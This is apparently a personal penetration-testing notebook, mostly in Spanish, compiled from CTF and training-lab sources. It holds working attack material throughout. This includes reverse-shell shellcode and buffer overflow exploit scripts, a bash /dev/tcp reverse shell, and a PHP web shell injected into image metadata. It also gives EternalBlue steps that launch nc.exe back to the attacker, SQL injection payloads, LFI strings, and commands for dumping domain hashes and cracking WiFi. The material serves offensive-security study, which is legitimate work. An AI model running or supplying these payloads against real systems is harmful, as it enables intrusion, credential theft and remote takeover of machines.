_Desde \&lt;_[_https://cybexsec.es/skeleton-en-python-para-buffer-overflow/_](https://cybexsec.es/skeleton-en-python-para-buffer-overflow/)_\&gt;_



msfvenom -p windows/shell\_reverse\_tcp lhost=\&lt;lhost\&gt; lport=4545 EXITFUNC=thread -f python -v shellcode -b &quot;\x00\x0d&quot;



msfvenom -p windows/exec cmd=&quot;calc.exe&quot; LHOST=\&lt;lhost\&gt; -b &quot;\x00\x0d&quot; -f python

!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll

!mona jmp -r esp

El resuldao se ve en la ventana LogData





[https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf](https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf)

[https://www.corelan.be/](https://www.corelan.be/)

[LiveOverflow Channel Introduction and Backstory - bin 0x00](https://www.youtube.com/watch?v=iyAyN3GFM7A&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

![](RackMultipart20210412-4-pcx9xb_html_ef226ddcb24d03d5.png)

-------------------------------------------------

[https://github.com/dplastico/CTF\_l4t1n\_abrl2020/tree/master/ret](https://github.com/dplastico/CTF_l4t1n_abrl2020/tree/master/ret)

from pwn import \*

#r = process(&#39;./ret&#39;)

r = remote(&#39;208.68.39.19&#39;, 4448)

#debugeando

#gdb.attach(r)

#print r.recvline()

payload =&quot;A&quot; \* cyclic\_find(&#39;kaaalaa&#39;)

payload += p64(0x401142) #ret to latin = win

payload += &quot;BBBBBBBB&quot;#padding bad exit

payload += &quot;CCCCCCCC&quot;

r.sendline(payload)

r.interactive()

_Desde \&lt;_[_https://github.com/dplastico/CTF\_l4t1n\_abrl2020/blob/master/ret/xpl.py_](https://github.com/dplastico/CTF_l4t1n_abrl2020/blob/master/ret/xpl.py)_\&gt;_



# Para Linux 64bit

Es al reves que en windows, el patrón es:

Nops + shellcode + junk + return address

Plantilla para linux 64bits

| from struct import pack

nop = &#39;\x90&#39;# msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.11.14.71 LPORT=4545 -b &#39;\x00&#39; -f pythonbuf = b&quot;&quot;buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;buf += b&quot;\xef\xff\xff\xff\x48\xbb\xc9\xbe\x91\x2c\xcc\xdd\x30&quot;buf += b&quot;\x01\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;buf += b&quot;\xa3\x97\xc9\xb5\xa6\xdf\x6f\x6b\xc8\xe0\x9e\x29\x84&quot;buf += b&quot;\x4a\x78\xb8\xcb\xbe\x80\xed\xc6\xd6\x3e\x46\x98\xf6&quot;buf += b&quot;\x18\xca\xa6\xcd\x6a\x6b\xe3\xe6\x9e\x29\xa6\xde\x6e&quot;buf += b&quot;\x49\x36\x70\xfb\x0d\x94\xd2\x35\x74\x3f\xd4\xaa\x74&quot;buf += b&quot;\x55\x95\x8b\x2e\xab\xd7\xff\x03\xbf\xb5\x30\x52\x81&quot;buf += b&quot;\x37\x76\x7e\x9b\x95\xb9\xe7\xc6\xbb\x91\x2c\xcc\xdd&quot;buf += b&quot;\x30\x01&quot;

calculated\_offset = 608rip = 0x7fffffffe2fcpayload\_len = calculated\_offset + 8 # overwrite base pointernop\_payload = 300 \* nopshell\_len = len(buf)nop\_len = len(nop\_payload)padding = &#39;A&#39; \* (payload\_len - shell\_len - nop\_len)payload = nop\_payload + buf +padding + pack(&quot;\&lt;Q&quot;, rip)

print(payload)  |
| --- |

Usar gdb

gdb bof

run \&lt; \&lt;(python -c &#39;print(&quot;patron\_creado&quot;)&#39;)

\&lt;\&lt;aquí se provocará el Segmentation Fault\&gt;\&gt;

(gdb) info register

Rbp

Tomar nota del RBP para hacer el offset query



Ejecutar

./bof \&lt; \&lt;(python bof.py)





# Chisel

sábado, 20 de marzo de 2021

08:26

[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It&#39;s written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn&#39;t require SSH access on the compromised target is a big bonus.

Before we can use chisel, we need to download appropriate binaries from the tool&#39;s [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using gunzip, and executed as normal:

![](RackMultipart20210412-4-pcx9xb_html_87faf955239e034f.png)

You must have an appropriate copy of the chisel binary on _both the attacking machine and the compromised server._ Copy the file to the remote server with your choice of file transfer method. You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:

scp -i KEY chisel user@target:/tmp/chisel-USERNAME

The chisel binary has two modes: _client_ and _server_. You can access the help menus for either with the command: chisel client|server --help

e.g:

![](RackMultipart20210412-4-pcx9xb_html_f1fa08451ad0971a.png)

We will be looking at two uses for chisel in this task (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not described here. You are encouraged to read through the help pages for the tool for this reason.

_ **Reverse SOCKS Proxy:** _

Let&#39;s start by looking at setting up a reverse SOCKS proxy with chisel. This connects _back_ from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use a command that looks something like this:

./chisel server -p LISTEN\_PORT --reverse &amp;

This sets up a listener on your chosen LISTEN\_PORT.

On the compromised host, we would use the following command:

./chisel client ATTACKING\_IP:LISTEN\_PORT R:socks &amp;

This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&amp;) to background the processes.

![](RackMultipart20210412-4-pcx9xb_html_ed2e04e6b5445330.png)

Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. As such, we will be using port 1080 when sending data through the proxy.

Note the use of R:socks in this command. &quot;R&quot; is prefixed to _remotes_ (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended.

_ **Forward SOCKS Proxy:** _

Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it&#39;s still well worth learning how to set up a forward proxy with chisel.

In many ways the syntax for this is simply reversed from a reverse proxy.

First, on the compromised host we would use:

./chisel server -p LISTEN\_PORT --socks5

On our own attacking box we would then use:

./chisel client TARGET\_IP:LISTEN\_PORT PROXY\_PORT:socks

In this command, PROXY\_PORT is the port that will be opened for the proxy.

For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

**Proxychains Reminder:**

When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:

[ProxyList]

# add proxy here ...

# meanwhile

# defaults set to &quot;tor&quot;

socks5  127.0.0.1 1080



Now that we&#39;ve seen how to use chisel to create a SOCKS proxy, let&#39;s take a look at using it to create a port forward with chisel.

_ **Remote Port Forward:** _

A remote port forward is when we connect back from a compromised target to create the forward.

For a remote port forward, on our attacking machine we use the exact same command as before:

./chisel server -p LISTEN\_PORT --reverse &amp;

Once again this sets up a chisel listener for the compromised host to connect back to.

The command to connect back is slightly different this time, however:

./chisel client ATTACKING\_IP:LISTEN\_PORT R:LOCAL\_PORT:TARGET\_IP:TARGET\_PORT &amp;

You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the LISTEN\_PORT and the LOCAL\_PORT. Here the LISTEN\_PORT is the port that we started the chisel server on, and the LOCAL\_PORT is the port we wish to open on our own attacking machine to link with the desired target port.

To use an old example, let&#39;s assume that our own IP is 172.16.0.20, the compromised server&#39;s IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:

./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &amp;

Connecting back to our attacking machine, functioning as a chisel server started with:

./chisel server -p 1337 --reverse &amp;

This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

_ **Local Port Forward:** _

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:

./chisel server -p LISTEN\_PORT

We now connect to this from our attacking machine like so:

./chisel client LISTEN\_IP:LISTEN\_PORT LOCAL\_PORT:TARGET\_IP:TARGET\_PORT

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:

./chisel client 172.16.0.5:8000 2222:172.16.0.10:22



As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each of the chisel processes.

_ **Note:** _ _When using Chisel on Windows, it&#39;s important to remember to upload it with a file extension of_ .exe _(e.g._ chisel.exe_)!_

_Desde \&lt;_[_https://tryhackme.com/room/wreath_](https://tryhackme.com/room/wreath)_\&gt;_



# Crack - wordlists

miércoles, 8 de julio de 2020

16:18

Wordlists [https://github.com/kaonashi-passwords/Kaonashi](https://github.com/kaonashi-passwords/Kaonashi)







# CrackmapExec

lunes, 3 de agosto de 2020

09:26

[https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/](https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/)

[https://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el.html](https://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el.html)

[http://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el\_13.html](http://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el_13.html)

docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec



## Dump de hashes del equipo

cme smb \&lt;ip\&gt; -u &#39;\&lt;user\&gt;&#39; -H &#39;\&lt;hashntlm\&gt;&#39; --sam

![](RackMultipart20210412-4-pcx9xb_html_c15f27a6dba14d03.png)

## Dump de Hashes del dominio

cme smb \&lt;ip\&gt; -u &#39;\&lt;user\&gt;&#39; -H &#39;\&lt;hashntlm\&gt;&#39; --ntds vss

![](RackMultipart20210412-4-pcx9xb_html_89476ef78861acf6.png)

## Bruteforcing

cme smb \&lt;ip\&gt; -u &#39;mvasquez&#39; -p /rockyou.txt



## Password spraying

Al tener una credencial, prueba en cuántos equipos tenemos permisos.

![](RackMultipart20210412-4-pcx9xb_html_8259a971c18a78f4.png)





# Crackpkcs

sábado, 27 de febrero de 2021

22:04

[https://github.com/crackpkcs12/crackpkcs12](https://github.com/crackpkcs12/crackpkcs12)

ejemplo

/usr/local/bin/crackpkcs12 cert.pfx -d ~/Downloads/rockyou.txt





Para comprobar

openssl pkcs12 -info -in cert.pfx

Enter Import Password:





# Compilar .Java

jueves, 28 de enero de 2021

12:31

javac algo.java ---\&gt;creará un archivo .class

java algo (sin extensión)



# CURL

jueves, 7 de mayo de 2020

14:38

[https://www.andreafortuna.org/2020/05/14/curl-my-own-cheatsheet/](https://www.andreafortuna.org/2020/05/14/curl-my-own-cheatsheet/)

**Curl** -\&gt; descarga una página y se pueden especificar parámetros. Y filtros.

curl -i -s -k -X $&#39;GET&#39; $&#39;http:/objetivo/algo.php&#39;

curl -d &quot;password=leonardo&quot; -X POST [http://88.198.233.174:42076/index.php](http://88.198.233.174:42076/index.php)

curl -s -v -P - &#39;[ftp://user:pass@172.20.0.1/](ftp://user:pass@172.20.0.1/)&#39; --\&gt;permite loguearse en ftp y listar el contenido.

curl -k -H &#39;Host: [s3cr3t4r3a.l4tinhtb.io](http://s3cr3t4r3a.l4tinhtb.io/)&#39; [https://45.79.216.154/](https://45.79.216.154/) --\&gt;para no tener que agregar al /etc/hosts

Curl -X POST -F &quot;submit:\&lt;value\&gt;&quot; -F &quot;\&lt;file-parameter\&gt;:@\&lt;path-to-file\&gt; \&lt;site\&gt; --\&gt;para subir un archivo



User Agent Injections (dos opciones)

1. curl -A &quot;Mozilla/5.0&#39;, (select\*from(select(sleep(20)))a)) #&quot; [http://example.com/insecure.php](http://example.com/insecure.php)

2. curl -v -X POST &quot;[https://victim/&quot;](https://victim/%22) -H &quot;user-agent: tes&quot;,(select version()),(select database())))-- -&quot; --data &quot;realdata&quot;

curl ipinfo.io/\&lt;ipvictima\&gt; trae datos geográficos de una IP

Cómo burlan paneles de autentificación básicos

![](RackMultipart20210412-4-pcx9xb_html_debfb191eb4588d7.png)



# CSRF - Cómo generar peticiones remotas

jueves, 7 de mayo de 2020

14:38

What are common ways to perform a CSRF attack?

The most popular ways to execute[CSRF attacks](http://www.cgisecurity.com/articles/csrf-faq.shtml) is by using a HTML image tag, or JavaScript image object. Typically an attacker will embed these into an email or website so when the user loads the page or email, they perform a web request to any URL of the attackers liking. Below is a list of the common ways that an attacker may try sending a request.

HTML Methods

IMG SRC \&lt;img src=&quot;http://host/?command&quot;\&gt;

SCRIPT SRC \&lt;script src=&quot;http://host/?command&quot;\&gt;

IFRAME SRC \&lt;iframe src=&quot;http://host/?command&quot;\&gt;

JavaScript Methods

&#39;Image&#39; Object

\&lt;script\&gt;

var foo = new Image();

foo.src = &quot;[http://host/?command](http://host/?command)&quot;;

\&lt;/script\&gt;

&#39;XMLHTTP&#39; Object (See &quot;Can applications using only POST be vulnerable?&quot; for when this can be used)

IE

\&lt;script\&gt;

var post\_data = &#39;name=value&#39;;

var xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);

xmlhttp.open(&quot;POST&quot;, &#39;[http://url/path/file.ext](http://url/path/file.ext)&#39;, true);

xmlhttp.onreadystatechange = function () {

if (xmlhttp.readyState == 4)

{

alert(xmlhttp.responseText);

}

};

xmlhttp.send(post\_data);

\&lt;/script\&gt;

Mozilla

\&lt;script\&gt;

var post\_data = &#39;name=value&#39;;

var xmlhttp=new XMLHttpRequest();

xmlhttp.open(&quot;POST&quot;, &#39;[http://url/path/file.ext](http://url/path/file.ext)&#39;, true);

xmlhttp.onreadystatechange = function () {

if (xmlhttp.readyState == 4)

{

alert(xmlhttp.responseText);

}

};

xmlhttp.send(post\_data);

\&lt;/script\&gt;

Many other ways exist in HTML/VBScript/JavaScript/ActionScript/JScript and other markup languages to make the users browser perform remote requests.



# Dirtycow

jueves, 4 de marzo de 2021

18:27

[https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c](https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c)

gcc cowroot.c -o cowroot -pthread







# Dive

jueves, 18 de febrero de 2021

22:43

Sirve para hacer ingeniería inversa a dockers

[https://github.com/wagoodman/dive#installation](https://github.com/wagoodman/dive#installation)

4.5. Using Dive

Dive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:

**4.5.1**. Layers (pictured in red)

**4.5.1.1.** This window shows the various layers and stages the docker container has gone through

**4.6**. **1.** Current Layer Contents (pictured in green)

**4.6.1.1.** This window shows you the contents of the container&#39;s filesystem at the selected layer

**4.7.1.** Layer Details (pictured in red)

**4.7.1.1.** Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.

![](RackMultipart20210412-4-pcx9xb_html_a75ca6b672c0f9ac.png)

- Navigate the data within the current window using the &quot;Up&quot; and &quot;Down&quot; Arrow-keys.
- You can swap between the Windows using the &quot;Tab&quot; key.

_Desde \&lt;_[_https://tryhackme.com/room/dockerrodeo?\_\_cf\_chl\_jschl\_tk\_\_=acf9183f6821b89aa806a17adcbc5725d24cc6fb-1613695165-0-Ady7jInzjhlC1Q-n7OwswqIElg7t93e\_HgQx6cVzOVaKMmAVTk\_JwwKl5V8u7OKor4wZe5vGokmKz7PP1TalDdyQhNMo0zV9vQ-QEkJor3HVQqVDubKTKLCJQxEEBaxqOtoT3b9rIvqhDAgwVpn19wsMlyosT5Gh5ozrTZrHJG3Q3JZf4k9bQLhOjKYpm2AXr7QyrqJ-TkSQOCdXEAf\_SSqbTPqwW3EBJTlOVuRFVYtmWFJlryiqUY0hfG8XP8JfW6QYtQX1CeACdEC7794v4FOz4KSHbpdEn\_V86SMdkH33q3J3ei-9stXPoZWNdT5\_qr5YXsCwXvxk9uXQdcRbnRUjTrYi9NQ7Eq32w6z7A5x-tqnedM36ewxqDYkPL7aVFuFF\_yqbxtSDux9gZPPWtbM_](https://tryhackme.com/room/dockerrodeo? __cf_chl_jschl_tk__ =acf9183f6821b89aa806a17adcbc5725d24cc6fb-1613695165-0-Ady7jInzjhlC1Q-n7OwswqIElg7t93e_HgQx6cVzOVaKMmAVTk_JwwKl5V8u7OKor4wZe5vGokmKz7PP1TalDdyQhNMo0zV9vQ-QEkJor3HVQqVDubKTKLCJQxEEBaxqOtoT3b9rIvqhDAgwVpn19wsMlyosT5Gh5ozrTZrHJG3Q3JZf4k9bQLhOjKYpm2AXr7QyrqJ-TkSQOCdXEAf_SSqbTPqwW3EBJTlOVuRFVYtmWFJlryiqUY0hfG8XP8JfW6QYtQX1CeACdEC7794v4FOz4KSHbpdEn_V86SMdkH33q3J3ei-9stXPoZWNdT5_qr5YXsCwXvxk9uXQdcRbnRUjTrYi9NQ7Eq32w6z7A5x-tqnedM36ewxqDYkPL7aVFuFF_yqbxtSDux9gZPPWtbM)_\&gt;_





# Eternalblue - Cómo explotarlo de forma manual

viernes, 5 de marzo de 2021

10:22

git clone [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

## Instalar lo necesario en Attackbox

instalar impacket con **python2**  **-m pip install**. en la carpeta de **impacket**

y luego ejecutar **python2 zzz\_exploit.py** en la carpeta que descaargué de github, dado que necesita una librería llamada **mysmb.py** que no viene por omisión.



Primero ejecutar el **checker.py**

A veces es necesario agregarle usuarios válidos para que funcione,

![](RackMultipart20210412-4-pcx9xb_html_51549639c74ee625.png)

!P@$$W0rD!123

Si el checker no entrega solución o se pega, darle de nuevo que no siempre resulta a la primera



Si el checker es positivo, hacer lo mismo pero ahora con el **zzz\_exploit.py**

Comentar el exploit que genera el txt y habilitar el siguiente que ejecuta código.

![](RackMultipart20210412-4-pcx9xb_html_117ce7b5a04d1373.png)

En este ejemplo, se le pide a windows que se conecte a un netshare(de nuestra autoría, levantado con impacket smbshare) y que ejecuta el nc.exe para windows(del repositorio sqlninja) a un nc ya en modo escucha desde nuestro equipo.

![](RackMultipart20210412-4-pcx9xb_html_2a750d9382607bb3.png)



# EXIFTOOL - Cómo poner un payload php en una imagen

jueves, 7 de mayo de 2020

14:39

1) exiftool -a -G4 &quot;-picture\*&quot; myfile.mp3

2) exiftool -COPYNUM:picture -b myfile.mp3 \&gt; cover.png

3) exiftool -b -ThumbnailImage (filename) \&gt; (Output filename)

[https://ryanmo.co/2014/09/28/exiftool-cheatsheet/](https://ryanmo.co/2014/09/28/exiftool-cheatsheet/)

exiftool -DocumentName=&quot;\&lt;h1\&gt;CLK\&lt;br\&gt;\&lt;?php if(isset(\$\_REQUEST[&#39;cmd&#39;])){echo &#39;\&lt;pre\&gt;&#39;;\$cmd = (\$\_REQUEST[&#39;cmd&#39;]);system(\$cmd);echo &#39;\&lt;/pre\&gt;&#39;;} \_\_halt\_compiler();?\&gt;\&lt;/h1\&gt;&quot; image.jpeg

_Desde \&lt;_[_https://drive.google.com/file/d/1WRsTIP\_L829mvjRWEBMNWcOZNkPW81Oe/view_](https://drive.google.com/file/d/1WRsTIP_L829mvjRWEBMNWcOZNkPW81Oe/view)_\&gt;_

Renombrar la imagen como .php.jpg

Una vez subida la imagen ejecutar:

[http://vulnerable/admin/uploads/1369904954.php.png?cmd=uname%20-a](http://vulnerable/admin/uploads/1369904954.png?c=uname%20-a)

Se puede cambiar el comando **uname -a** por cualquier otro.



# FLUXION + PYRIT + CRUNCH - Cómo romper wifi con una red de equipos

jueves, 7 de mayo de 2020

14:39

para obtener el handshake

-- github.com/FluxionNetwork/fluxion.git

./fluxion

.5

.1

.3

(si no aparecen ssid es que la red está ocupada por otro proceso.

utilizar

airmon-ng check



kill \&lt;procesos activos\&gt;

ejecutar nuevamente fluxion

Una vez listado los ssid, presionar ctrl-c para que se importen los datos a fluxion

seleccionar el número del ssid a atacar.

.2 (handshake snooping)

.2 (airplay desatentication)

.1 pyrit verification

.1 cada 30 segundos



.1 Asyncrona

una vez obtenido el handshake se puede detener el proceso y salir

El handshake (.cap) se guardará en fluxion/attack/handshake snooper/handshakes



pyrit -\&gt; cpu&#39;s password

github.com/JPaulMora/Pyrit.git

apt install pyrit pyrit\_opencl



pyrit benchmark

indicará la cantidad de paswword procesados por segundo

pyrit server (en equipos zombies) y editar el archivo para poner rpc\_server = true

leafpad /root/.pyrit/config

rpc\_knownclients = \&lt;zombie1\&gt; \&lt;zombie2\&gt;

rpc\_server = true

crunch -\&gt;diccionario al handshake

crunch 8 8 0123456789 | pyrit -r \&lt;archivo.cap\&gt; -e \&lt;bssi\&gt; -i - attack\_passthrough



# Git commands

domingo, 16 de agosto de 2020

17:09

git log

git log -p

git branch (-r)

git tag

git show



# IMPACKET

viernes, 24 de julio de 2020

21:31

En caso que impacket no esté instalado, es más útil correrlo desde docker

Touch ./Dockefile

docker build -t &quot;impacket:latest&quot; --file ./Dockefile .

docker run -it --rm &quot;impacket:latest&quot;



-------------------------

/usr/bin/impacket-GetUserSPNs

sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.106.50 -request

---\&gt; this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

A veces no es necesario el sudo o el python

![](RackMultipart20210412-4-pcx9xb_html_15bcb522e911bf26.png)

/usr/bin/impacket-netview

/usr/bin/impacket-ntlmrelayx -\&gt; EN combinación con el responder, podemos secuestrar la petición de un sitio inválido para redirigirlo a un objetivo y pedirle que ejecute un comando

![](RackMultipart20210412-4-pcx9xb_html_4d4fabcbf09b280d.png)

/usr/bin/impacket-rpcdump

/usr/bin/impacket-samrdump

/usr/bin/impacket-secretsdump secretsdump.py -just-dc [backup:backup2517860@spookysec.local](mailto:backup:backup2517860@spookysec.local) ---\&gt;permite extraer todos los hashes del dominio y luego explotarlo via pass the hash

/usr/bin/impacket-smbserver para compartir por linux una carpeta tipo windows.

![](RackMultipart20210412-4-pcx9xb_html_96cfa5817038bd33.png)

/usr/bin/impacket-ticketer

/usr/bin/impacket-wmiexec

enum4linux -A

enum4linux -R (rango) para acotar la lista de RIDS

--\&gt; enumerador de servidor, independiente del sistema operativo

GetNPUsers.py spookysec.local/svc-admin -no-pass (sirve cuando se tiene el puerto 88 abierto)

[https://www.hackingarticles.in/impacket-guide-smb-msrpc/](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)





# IPTABLES - Como enrutar (MitM)

jueves, 7 de mayo de 2020

14:41

iptables -t nat -F --------

sirve para hacer flush del iptables del nat

root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080



root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

se agrega cada puerto que quisiera sniffearse



# KALI - Cómo instalar Guest Additions de Virtualbox en kali

jueves, 7 de mayo de 2020

14:39

Devices -\&gt; Install Guest Additions

apt-get install linux-headers-`uname -r`



Cd /media/cdrom/



Sh VBoxLinuxAdditions.run



reboot







# Kali en windows.. como hacer funcionar el rdp

jueves, 7 de mayo de 2020

14:40

[https://www.solvetic.com/tutoriales/article/5070-instalar-kali-linux-con-interfaz-grafica-en-windows-10/](https://www.solvetic.com/tutoriales/article/5070-instalar-kali-linux-con-interfaz-grafica-en-windows-10/)

sudo apt-get remove xrdp vnc4server tightvncserver

sudo apt-get install tightvncserver

sudo apt-get install xrdp



Then restart the xrdp service:

sudo service xrdp restart



# Kerbrute

viernes, 24 de julio de 2020

22:04

Este funciona si el puerto 88 está abierto

![](RackMultipart20210412-4-pcx9xb_html_39a03b358b8c3f1a.png)

[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

./kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt

Para enumerar usuarios válidos en un windows

![](RackMultipart20210412-4-pcx9xb_html_1d77acb64fa1fbcb.png)



# LFI - Cómo hacer local file inclusion

jueves, 7 de mayo de 2020

14:40

Using for local file inclusion

curl [http://xqi.cc/index.php?m= **php://filter/convert.base64-encode/resource=** index](http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index)

Esto devuelve en base64 el código fuente del archivo index.



También puede servir

?page=php://filter/resource=/etc/passwd

_Desde \&lt;_[_https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601_](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)_\&gt;_

/proc/net/tcp para ver los puertos abiertos.

[http://vulnnet.thm/?referer=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf](http://vulnnet.thm/?referer=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf)



[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection)

Java LFI

{{7\*7}}

Hello 49



Si está restringido el ../.. Se puede usar algo así.

view=/var/www/html/development\_testing **/.././.././../** log/apache2/access.log







# LINUX - Comandos útiles

jueves, 7 de mayo de 2020

14:41

Para revisar espacio en disco

df -h -\&gt;muestra el espacio usado y libre de cada filesystem

du -sh \* --\&gt;muestra el tamaño de cada carpeta del directorio donde estamos actualmente.

Para agregar al history la hora y fecha de las acciones (sirve para auditar)

echo &quot;export HISTTIMEFORMAT= &#39;%F %T : &#39;&quot; \&gt;\&gt; $HOME/.bashrc

para instalar requerimientos de un software descargado.

Pip install -r requeriments.txt

Para actualiza la lista de versiones y luego actualiza todo lo que necesite actualizar.

apt update &amp;&amp; apt dist-upgrade

Si es que la instalación se pega o falla.

sudo apt -f install

Configura kali para que lo que encuentra grep se ponga rojo

export GREP\_OPTIONS=&#39;--color=auto&#39;

Decifrar de base64

echo SmFpclBhbG1h | base64 -d

Para quitar los saltos de linea en un archivo para dejarlos uno al lado del otro

sed -n -e &#39;1x;1!H;${x;s-\n- -gp}&#39; fichero\_fuente \&gt; fichero\_destino

sed &#39;52!d&#39; nice\_list.txt --\&gt; muestra la linea 52 del archivo

Para tabular un CSV en una consola

column –s\&lt;delimitador\&gt; -t

Para reemplazar contenido en archivos ya creados.

sudo sed -i &#39;s/port=3389/port=3390/g&#39; /etc/xrdp/xrdp.ini

Para pasar de espacios a saltos de lineas (para hacer diccionarios)

sed &#39;s/ /\n/&#39;

tr &#39;r&#39; &#39;s&#39; -\&gt;reemplaza todas las r por s

tr -d &quot;r&quot; --\&gt;saca todas las r del contenido

cat xxx | tr [G-ZA-Fg-za-f] [T-ZA-St-za-s] --\&gt;para hacer rot13

Para discriminar la respuesta de una columna

awk &#39;{print $4 &quot; &quot; $5}&#39; --\&gt;muestra la columna 4 y 5

awk &#39;NF{print $NF}&#39; --\&gt; muestra la última columna

Para reemplazar el cat /proc/sys/net/ipv4/ip\_forward \&gt; 1

sysctl -w net.ipv4.ip\_forward=1

Para hacer conexión reversa.. se puede incluir en llamadas de pentesting (necesita tener un nc -lp \&lt;puertoreverso\&gt;)

bash -i \&gt;&amp; /dev/tcp/\&lt;ipreversa\&gt;/\&lt;puertoreverso\&gt; 0\&gt;&amp;1

Para crear un archivo con guiones antes (sirve para vectores de ataque con parametros)

echo &quot;&quot;\&gt; --checkpoint=1

Para crear password en shadow

mkpasswd -m sha-512 newpasswordhere

Para crear password en passwd

openssl passwd newpasswordhere

openssl passwd -6 newpass --\&gt;para crear contraseñas sha-512 $6$G

Para extraer páginas web de dump de datos.

cat file | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=\_-]\*&quot;\*

curl [http://host.xx/file.js](http://host.xx/file.js) | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=\_-]\*&quot;\*

Para copiar directamente a la clipboard la ip del tun0

alias miip=&#39;ip a | grep tun0 -B 3 | tail -1 | xargs | cut -d\/ -f1 | cut -d\ -f2 | tr -d &quot;\n&quot; | xclip -sel clip&#39;

Para extraer un pedazo de texto de una linea

$texto=textocompleto

$echo ${texto:\&lt;posicioninicial\&gt;:\&lt;cantidaddecaracteres\&gt;}

Para extraer los puertos abiertos del equipo local cuando no funciona isof, netstat, ifconfig, etc..

$cat /proc/net/tcp | awk &#39;{print $2}&#39; | sort -u | cut -d\; -f2

(luego ocupar print 0x\&lt;valor\&gt; para pasar de hexa a decimal)

Para agregar una ip al archivo hosts

echo &quot;ipaddress dominio.thm | sudo tee -a /etc/hosts

Para esconder datos en un sistema operativo, linkeados a un archivo

setfattr -n user.Name -v Jair file

Para escanear puertos abiertos locales y no se tiene nmap o isof o netstat (port scanner)

for i in {1..65535}; do (echo \&gt; /dev/tcp/192.168.1.1/$i) \&gt;/dev/null 2\&gt;&amp;1 &amp;&amp; echo $i is open; done

Para leer datos ocultos

getfattr -d file

_Desde \&lt;_[_https://www.tutorialspoint.com/unix\_commands/getfattr.htm_](https://www.tutorialspoint.com/unix_commands/getfattr.htm)_\&gt;_







# LOG POISONING

jueves, 7 de mayo de 2020

14:41

Cuando se puede leer desde la web el log de apache.

